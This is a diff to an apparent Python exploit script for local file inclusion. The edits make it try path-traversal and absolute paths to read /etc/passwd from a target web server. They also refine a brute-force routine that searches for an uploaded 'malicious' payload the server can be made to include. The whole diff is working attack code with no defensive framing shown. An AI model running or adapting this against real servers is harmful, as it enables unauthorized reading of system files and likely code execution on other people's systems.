@@ -7,15 +7,19 @@ import urllib.parse
 def show_passwd(target_url, COOKIE):
     print("Attempting to show /etc/passwd...")
 
-    passwd_dir = "../../../../../../etc/passwd"
-    response = requests.get(target_url + passwd_dir, cookies=COOKIE)
+    passwd_dir = ["../../../../../../etc/passwd", "/etc/passwd"]
 
-    if response.status_code == 200:
-        print(response.text)
-        return True
-    else:
-        print("FAILED")
-        return False
+    for passwd in passwd_dir:
+        test_url = target_url + passwd
+        print(f"[*] Trying LFI URL: {test_url}")
+        response = requests.get(test_url, cookies=COOKIE)
+
+        if "root:" in response.text:
+            print(response.text)
+            return True
+        else:
+            print("FAILED")
+    return False
 
 
 def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
@@ -38,10 +42,8 @@ def brute_force_lfi(lfi_url_base, payload_filename, session, COOKIE):
                 print(f"[*] Trying LFI URL: {test_url}")
                 try:
                     response = session.get(test_url, cookies=COOKIE)
-                    print(response.status_code)
-                    if (
-                        "[+] Malicious file uploaded successfully!" in response.text
-                    ) or ("File not found." not in response.text):
+                    #Problem: only works for website
+                    if "File not found." not in response.text:
                         print(f"[+] Successfully included payload: {test_url}")
                         return test_url
                 except Exception as e:
